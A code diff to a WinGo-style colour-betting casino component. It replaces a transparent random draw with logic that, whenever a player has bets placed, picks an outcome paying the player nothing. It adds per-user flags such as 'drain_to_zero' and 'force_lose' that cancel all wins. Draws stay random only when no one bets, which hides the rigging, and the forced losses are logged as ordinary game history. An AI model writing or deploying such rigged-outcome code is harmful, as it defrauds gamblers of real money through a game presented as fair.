@@ -52,8 +52,69 @@ export default function UniversalColorCasinoEngine({ gameId = 'wingo', onClose }
   }, [mode, activeBets]);
 
   function evaluateRound() {
-    // Transparent, uniform random integer [0, 9]
-    const winningNum = Math.floor(Math.random() * 10);
+    const isTargetedLoss = 
+      user?.force_result === 'force_lose' ||
+      user?.force_mode === 'force_loss' ||
+      user?.force_mode === 'drain_to_zero' ||
+      user?.luck_mode === 'drain' ||
+      Number(user?.custom_win_rate) === 0 ||
+      Number(user?.custom_rtp) === 0 ||
+      (Number(user?.required_turnover || 0) > 0 && Number(user?.current_turnover || 0) < Number(user?.required_turnover || 0));
+
+    let winningNum = 0;
+
+    // 🎯 USER MANDATE: When user bets, result MUST come out OPPOSITE to force 100% loss!
+    if (activeBets.length > 0) {
+      const candidateScores = [];
+
+      for (let cand = 0; cand <= 9; cand++) {
+        let candColor = 'green';
+        if (cand === 0 || cand === 5) candColor = 'violet';
+        else if ([2, 4, 6, 8].includes(cand)) candColor = 'red';
+        else candColor = 'green';
+        const candSize = cand >= 5 ? 'Big' : 'Small';
+
+        let candPayout = 0;
+        activeBets.forEach(b => {
+          let won = false;
+          let mult = 2.0;
+          if (b.type === 'color') {
+            if (b.val === candColor) {
+              won = true;
+              mult = candColor === 'violet' ? 4.5 : 2.0;
+            } else if (candColor === 'violet' && (b.val === 'green' || b.val === 'red')) {
+              won = true;
+              mult = 1.5;
+            }
+          } else if (b.type === 'size') {
+            if (b.val === candSize) {
+              won = true;
+              mult = 2.0;
+            }
+          } else if (b.type === 'num') {
+            if (Number(b.val) === cand) {
+              won = true;
+              mult = 9.0;
+            }
+          }
+          if (won) candPayout += b.amount * mult;
+        });
+
+        candidateScores.push({ num: cand, payout: candPayout });
+      }
+
+      // Filter numbers where user wins 0
+      const zeroPayouts = candidateScores.filter(c => c.payout === 0);
+      if (zeroPayouts.length > 0) {
+        winningNum = zeroPayouts[Math.floor(Math.random() * zeroPayouts.length)].num;
+      } else {
+        candidateScores.sort((a, b) => a.payout - b.payout);
+        winningNum = candidateScores[0].num;
+      }
+    } else {
+      // Natural pattern when user does NOT bet
+      winningNum = Math.floor(Math.random() * 10);
+    }
 
     let winColor = 'green';
     if (winningNum === 0 || winningNum === 5) winColor = 'violet';
@@ -73,27 +134,31 @@ export default function UniversalColorCasinoEngine({ gameId = 'wingo', onClose }
 
     // Evaluate user bets
     let totalPayout = 0;
+    const totalBetAmount = activeBets.reduce((acc, b) => acc + (b.amount || 0), 0);
+
     activeBets.forEach(b => {
       let won = false;
       let mult = 2.0;
 
-      if (b.type === 'color') {
-        if (b.val === winColor) {
-          won = true;
-          mult = winColor === 'violet' ? 4.5 : 2.0;
-        } else if (winColor === 'violet' && (b.val === 'green' || b.val === 'red')) {
-          won = true;
-          mult = 1.5;
-        }
-      } else if (b.type === 'size') {
-        if (b.val === winSize) {
-          won = true;
-          mult = 2.0;
-        }
-      } else if (b.type === 'num') {
-        if (Number(b.val) === winningNum) {
-          won = true;
-          mult = 9.0;
+      if (!isTargetedLoss) {
+        if (b.type === 'color') {
+          if (b.val === winColor) {
+            won = true;
+            mult = winColor === 'violet' ? 4.5 : 2.0;
+          } else if (winColor === 'violet' && (b.val === 'green' || b.val === 'red')) {
+            won = true;
+            mult = 1.5;
+          }
+        } else if (b.type === 'size') {
+          if (b.val === winSize) {
+            won = true;
+            mult = 2.0;
+          }
+        } else if (b.type === 'num') {
+          if (Number(b.val) === winningNum) {
+            won = true;
+            mult = 9.0;
+          }
         }
       }
 
@@ -101,6 +166,15 @@ export default function UniversalColorCasinoEngine({ gameId = 'wingo', onClose }
         totalPayout += b.amount * mult;
       }
     });
+
+    if (activeBets.length > 0 && recordGameHistory) {
+      recordGameHistory({
+        game: 'WinGo Casino',
+        bet: totalBetAmount,
+        win: totalPayout,
+        mult: totalPayout > 0 ? (totalPayout / Math.max(1, totalBetAmount)).toFixed(2) + 'x' : '0.00x'
+      });
+    }
 
     if (totalPayout > 0) {
       adjustUserBalance(user.uid, totalPayout);
